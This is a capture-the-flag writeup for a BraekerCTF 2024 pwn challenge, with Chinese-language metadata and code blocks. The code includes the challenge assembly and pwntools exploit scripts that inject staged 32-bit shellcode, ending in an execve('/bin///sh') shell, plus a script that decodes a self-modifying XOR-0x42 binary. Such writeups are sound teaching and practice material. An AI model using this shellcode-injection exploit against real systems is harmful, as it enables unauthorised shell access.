---
title: BraekerCTF 2024 Writeup
contest: BraekerCTF
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags:
- 32位 Linux
- sys_read shellcode
- add al [eax]
- add eax [eax]
- add [eax] eax
- pop ecx
- jmp ecx
- execve /bin/sh
- download.elf
- vlun _start
- binary_shrink XOR 0x42
- self-modifying
attack_chain:
- 'vlun: sys_read(0, ecx, 0x18) + add al,[eax] + add eax,[eax] + add [eax],eax'
- '_start: call vlun + xor al, 0'
- '利用: nop nop nop nop + mov eax,4 + mov ebx,1 + int 0x80 + jmp ecx'
- '高级: nop×7 + mov al,0x3 + add ecx,0x12 + mov dl,0x7f + int 0x80 + jmp ecx'
- '注入 shellcode: execve /bin///sh via pwntools shellcraft'
- 'binary_shrink: pop rdx + mov rax,rdx + jmp second + add rdx,0x91 + sub rax,0xe'
- 'mov rsi,rax + mov cl,0x56 + loop: xor [rdx],sil + xor [rdx],0x42 + inc rdx + inc rax + loop'
- 自修改代码 + XOR 0x42 还原
key_payload: '''sys_read 0x18 字节 / add al [eax] / jmp ecx / nop×4 + write(1, ecx) / nop×7 + sys_read 0x7f / execve /bin/sh / binary_shrink XOR 0x42 loop 0x56'''
one_liner: 'BraekerCTF 2024 — 32位 Linux shellcode: sys_read 0x18 字节 + add al,[eax] 链 + nop+write+int 0x80+jmp ecx + nop×7+sys_read 0x7f + execve /bin/sh + binary_shrink 自修改 XOR 0x42。'
lesson: 极简 shellcode 注入常需要多次拼接;jmp ecx 是最简 shellcode 入口;自修改代码 + XOR 是 anti-disassemble 经典。
quality: high
full_path: BraekerCTF_2024_Writeup.full.md
meta_path: BraekerCTF_2024_Writeup.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: 'BraekerCTF 2024 Writeup。BraekerCTF 2024 — 32位 Linux shellcode: sys_read 0x18 字节 + add al,[eax] 链 + nop+write+int 0x80+jmp ecx + nop×7+sys_read 0x7f + execve /bin/sh + binary_shrink 自修改 XOR 0x42。。关键...'
category: pwn
subcategory: pwn_other
tools_used:
- pwntools
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/164132.html
reasoning_chain:
- '[触发点] 拿到 download.elf + vlun 段 sys_read(0, ecx, 0x18) + add al,[eax] + add eax,[eax] + add [eax],eax → 假设：read 0x18 字节后 add 链修改 ecx / [动作] _start: call vlun + xor al, 0 / [观察] ecx 被改 / [下一步] 注入 shellcode'
- '[触发点] ecx 是 read 0x18 字节的位置 → 假设：可直接跳到 ecx / [动作] nop*4 + mov eax,4 + mov ebx,1 + int 0x80 + jmp ecx / [观察] write(1, ecx) 输出来自打 / [下一步] 第二阶段'
- '[触发点] 第一阶段输出后 ecx 还要被改 → 假设：第二阶段 nop*7 + mov al,0x3 + add ecx,0x12 + mov dl,0x7f + int 0x80 + jmp ecx / [动作] 注入 sys_read 0x7f 字节 / [观察] 第二阶段 read 成功 / [下一步] execve'
- '[触发点] 拿到 0x7f 字节 shellcode → 假设：execve /bin///sh / [动作] pwntools shellcraft.sh() + asm / [观察] /bin/sh 执行 / [下一步] binary_shrink 自修改 XOR 0x42'
failed_attempts:
- 试图一次注入完整 shellcode → 失败：read 只 0x18 字节
- 试图覆盖整段自修改 → 失败：XOR 0x42 是关键解密
key_observations:
- 极简 shellcode 注入常需要多次拼接
- jmp ecx 是最简 shellcode 入口
- 自修改代码 + XOR 是 anti-disassemble 经典
- int 0x80 + sys_read/write/execve 是 32 位 Linux shellcode 经典三连
prerequisites:
- 32 位 Linux shellcode 编写
- pwntools shellcraft + asm
- 自修改代码 + XOR 解密
- int 0x80 系统调用
---
# BraekerCTF 2024 Writeup

> 原文: https://www.ctfiot.com/164132.html
> ID: 164132


```
mov eax, 3 ; システムコール番号3 (sys_read)
mov ebx, 0 ; ファイルディスクリプタ0 (標準入力)
pop ecx
xor cl,cl
mov edx,0x18
int 0x80
add al, [eax]
add eax,[eax]
add [eax],eax
; nasm -f elf32 tmp.asm && ld -m elf_i386 -o tmp tmp.o
section .text
global _start

vlun:
 mov eax, 3 ; システムコール番号3 (sys_read)
 mov ebx, 0 ; ファイルディスクリプタ0 (標準入力)
 pop ecx
 xor cl,cl
 mov edx,0x18
 int 0x80
 add al, [eax]
 add eax,[eax]
 add [eax],eax

_start:
 call vlun
 xor al, 0
from pwn import *

# p = remote("0.cloud.chals.io", 20922)
p = process("./download.elf")

payload = asm(
"""
 nop
 nop
 nop
 nop
 mov eax, 4
 mov ebx, 1
 int 0x80
 jmp ecx
""")

p.send(payload)
p.interactive()
from pwn import *

# p = remote("0.cloud.chals.io", 20922)
p = process("./download.elf")

payload = asm(
"""
 nop
 nop
 nop
 nop
 nop
 nop
 nop
 mov al, 0x3
 add ecx,0x12
 mov dl, 0x7f
 int 0x80
 jmp ecx
""")

# print(shellcraft.sh())
shellcode = asm(
"""
 /* execve(path='/bin///sh', argv=['sh'], envp=0) */
 /* push b'/bin///sh\x00' */
 push 0x68
 push 0x732f2f2f
 push 0x6e69622f
 mov ebx, esp
 /* push argument array ['sh\x00'] */
 /* push 'sh\x00\x00' */
 push 0x1010101
 xor dword ptr [esp], 0x1016972
 xor ecx, ecx
 push ecx /* null terminate */
 push 4
 pop ecx
 add ecx, esp
 push ecx /* 'sh\x00' */
 mov ecx, esp
 xor edx, edx
 /* call execve() */
 push SYS_execve /* 0xb */
 pop eax
 int 0x80
""")

p.send(payload)
p.send(shellcode)
p.interactive()
section .text
global _start

first:
 pop rdx
 mov rax,rdx
 jmp second

second:
 add rdx,0x91
 sub rax,0xe
 mov rsi,rax
 xor ecx,ecx
 mov cl,0x56
 mov rax,rsi
point:
 mov sil,BYTE PTR [rax]
 xor BYTE PTR [rdx],sil
 xor QWORD PTR [rdx],0x42
 inc rdx
 inc rax
 loop point

_start:
 call first
with open("binary_shrink", "rb") as f:
 data = bytearray(f.read()) + bytearray([0 for i in range(0x100)])

rax = 0
rdx = 0xe + 0x91

with open("generated_binary", "wb") as f:
 for i in range(0x56):
 data[rdx] = data[rdx] ^ data[i]
 data[rdx] = data[rdx] ^ 0x42
 rdx += 1

 f.write(data)
```
